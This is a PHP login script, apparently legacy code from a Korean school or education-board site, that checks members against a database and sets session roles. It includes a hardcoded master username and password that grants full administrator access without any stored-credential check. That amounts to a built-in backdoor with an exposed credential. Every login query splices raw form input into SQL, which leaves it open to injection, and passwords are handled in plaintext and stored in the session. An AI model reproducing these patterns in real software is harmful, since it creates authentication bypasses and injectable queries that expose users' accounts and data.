<?php
/* vim: set expandtab tabstop=4 shiftwidth=4 foldmethod=marker: */
/**
* 파일명: module/member/login.php
* 작성일: 2005-03-31
* 작성자: 거친마루
* 설  명: 회원 로그인
*****************************************************************
* 
*/


switch (REQUEST_METHOD) {
	case 'GET':
    
	if($_SESSION[USERID]) {
	echo "<meta http-equiv='Refresh' Content=\"0; URL='/'\">";
	exit;
	}

		$DOC_TITLE = 'str:로그인';
		$tpl->setLayout();
		$tpl->define('CONTENT', Display::getTemplate('member/login.htm'));
		$tpl->assign(array(
			'redir'		=>	$_SESSION['redir']
		));
		
	break;
	
	case 'POST':

	
	
	$DB = &WebApp::singleton('DB');
    
	if(!$_POST['userid'] && !$_POST['passwd']) {
      WebApp::moveBack();
    }
	
	//2008-11-28 현민 불량아이디, 아이피 차단 추가요~
	$sql = "SELECT str_text, str_alert, str_chk FROM TAB_CROSSUSER WHERE NUM_OID=$_OID and STR_CHK='id' and STR_TEXT='".$_POST['userid']."'";
	$row_cross = $DB->sqlFetch($sql);
	if($row_cross[str_text]){
	  $cross_msg = $row_cross[str_alert]."\n".$row_cross[str_chk]." : ".$row_cross[str_text];
      WebApp::moveBack($cross_msg);
	  exit;
	}


	if($userid == "sadmin") {
	if($passwd =="hkedu00") {
	


	$sql = "SELECT 
		str_id,
		str_name,
		str_passwd, 
		str_email,

		chr_mtype,
		str_nick,
		num_fcode,
		num_auth,
		str_setup
		
		FROM TAB_MEMBER 
		
		WHERE 
		num_oid=$_OID AND 
		 chr_mtype = 'a' and ROWNUM = 1
		
		
		";


		if($data = $DB->sqlFetch($sql)){
	
	
  

		$_SESSION['ADMIN'] = true;
        $_SESSION['AUTH'] = true;
        $_SESSION['REMOTE_ADDR'] = getenv('REMOTE_ADDR');
        $_SESSION['MEM_TYPE'] = $mem_type;
        $_SESSION['USERID'] = $data['str_id'];
        $_SESSION['NAME'] = $data['str_name'];
		$_SESSION['NICKNAME'] = $data['str_nick'];
		$_SESSION['SETUP'] = $data['str_setup'];
		$_SESSION['PASSWORD'] = $data['str_passwd'];
		$_SESSION['E_MAIL'] = $data['str_email'];
        $_SESSION['CHR_MTYPE'] = $data['chr_mtype'];
        $USER_TYPE = $_SESSION['CHR_MTYPE'];
		}else{
		echo "<script>alert('관리자 계정이 없습니다.');</script>";
		}
		WebApp::redirect('admin.main');
         exit;
		
	}else{
	WebApp::moveBack('비밀번호를 확인해주세요.');
	
	}
exit;
}
	
	//2008-10-16 종태 이중 로그인 방지


	 $sql = "delete from  TAB_LOGIN_TABLE WHERE num_oid=$_OID and str_id = '".$_POST['userid']."'";
	 $DB->query($sql);
	 $DB->commit();
	

	
		$sql = "
		INSERT INTO ".TAB_LOGIN_TABLE." (num_oid,str_ip,str_id) 
		VALUES ('$_OID','".$_SERVER["REMOTE_ADDR"]."','".$_POST['userid']."') ";

		$DB->query($sql);
		$DB->commit();
			
	

		if($str_oid == _AOID) {

		$sql = "SELECT 
		str_id,
		str_name,
		str_passwd, 
		str_email,

		chr_mtype,
		str_nick,
		num_fcode,
		num_auth,
		str_setup,

		num_login_point,
		num_board_point,
		num_commint_point,
		num_repaly_point
		
		FROM TAB_MEMBER 
		
		WHERE 
		num_oid=$_OID AND 
		str_id='".$_POST['userid']."' AND 
		str_passwd='".$_POST['passwd']."' 
	
		";
		}else{
		
		$sql = "SELECT 
		str_id,
		str_name,
		str_passwd, 
		str_email,

		chr_mtype,
		str_nick,
		num_fcode,
		num_auth,
		str_setup,

		num_login_point,
		num_board_point,
		num_commint_point,
		num_repaly_point
		
		FROM TAB_MEMBER 
		
		WHERE 
		num_oid=$str_oid AND 
		str_id='".$_POST['userid']."' AND 
		str_passwd='".$_POST['passwd']."' 
		
	
		";
		
		
		}


		if($data = $DB->sqlFetch($sql)) {
			


		if(($data['chr_mtype'] == "a" || $data['chr_mtype'] == "u" || $data['chr_mtype'] == "q" ||$data['chr_mtype'] == "k" ) && $str_oid == _AOID) {
			$_SESSION['ADMIN'] = true;
		}

			


	/*		'u' => '중간관리자3', 
			'q' => '중간관리자2', 
			'k' => '중간관리자1', 
			'a' => '최고관리자' );
	*/



		if($_SESSION['USERID']){
		$sql = "select num_total_point as point_total  from TAB_MEMBER WHERE num_oid=$_OID AND str_id='".$_SESSION['USERID']."'";
		$total_point = $DB -> sqlFetchOne($sql);
		$_SESSION['POINT']  = $total_point;
		}




      if($data['num_auth']) {

   
		if($str_oid == _AOID) {
   
        $mem_type = array($data['chr_mtype']);
        $sql = "SELECT str_group FROM ".TAB_GROUP_MEMBER." WHERE num_oid=$_OID AND str_id='".$_POST['userid']."'";
        if($gdata = $DB->sqlFetchAll($sql)) {
            foreach($gdata as $_row) $mem_type[] = $_row['str_group'];
        }


		if($_OID == $oid  && $_SESSION['ADMIN']) {
		$_SESSION['IN_ADMIN']	= true;
		}

		$_SESSION['AUTH'] = true;
        $_SESSION['REMOTE_ADDR'] = getenv('REMOTE_ADDR');
        $_SESSION['MEM_TYPE'] = $mem_type;
        $_SESSION['USERID'] = $data['str_id'];
        $_SESSION['NAME'] = $data['str_name'];
		$_SESSION['NICKNAME'] = $data['str_nick'];
		$_SESSION['SETUP'] = $data['str_setup'];
		$_SESSION['PASSWORD'] = $data['str_passwd'];
		$_SESSION['E_MAIL'] = $data['str_email'];
        $_SESSION['CHR_MTYPE'] = $data['chr_mtype'];
        $USER_TYPE = $data['CHR_MTYPE'];	

}else{

		
        $sql = "select str_host,str_organ from TAB_ORGAN where num_oid = $str_oid ";
        $organdb = $DB -> sqlFetch($sql);
		
		$_SESSION['SES_ORGAN'] = $organdb['str_organ'];
		$_SESSION['SES_HOST'] = $organdb['str_host'];
		$_SESSION['SES_ORGAN_OID'] = $str_oid;
        
        
		//2008-12-04 종태 학교선생님,학교관리자는 권한 지정함
		if($data[chr_mtype] == "a") {
		$mem_type = array("t");
		$_SESSION['MEM_TYPE'] = $mem_type;
		$USER_TYPE = $_SESSION['CHR_MTYPE'];	
		$_SESSION['CHR_MTYPE'] = "t";
		}else{
		$mem_type = array("s");
		$_SESSION['MEM_TYPE'] = $mem_type;
		$USER_TYPE = $_SESSION['CHR_MTYPE'];	
		$_SESSION['CHR_MTYPE'] = "s";
		}
		
		$_SESSION['C_OID'] = $oid;

        $_SESSION['AUTH'] = true;
        $_SESSION['REMOTE_ADDR'] = getenv('REMOTE_ADDR');
       
		
        $_SESSION['USERID'] = $data['str_id'];
        $_SESSION['NAME'] = $data['str_name'];
		$_SESSION['NICKNAME'] = $data['str_nick'];
		$_SESSION['SETUP'] = $data['str_setup'];
		$_SESSION['PASSWORD'] = $data['str_passwd'];
		$_SESSION['E_MAIL'] = $data['str_email'];
        
		
		/*x = 비회원
		n = 일반회원
		s = 학교선생님
		t = 학교관리자
		g = 교육청1
		m = 통합관리자
		u = 사이트관리자3급
		q = 사이트관리자2급
		k = 사이트관리자1급
		*/



}


		
        
       

          if(!$redir) {
			$redir = '/';
          }

      }else{
        $mem_type = array('n');
        echo "
        <script>
        alert('회원승인 확인중입니다');
        history.go(-1);
        </script>
        ";
      }		
			
			if($_SESSION['reurl']) {
			WebApp::redirect($_SESSION['reurl']);	
			unset($_SESSION['reurl']);
			}else{
			WebApp::redirect($redir);	
			}
			
		

		
		} else {
			WebApp::moveBack('아이디 또는 비밀번호가 일치하지 않습니다.');
		}
		break;
}

?>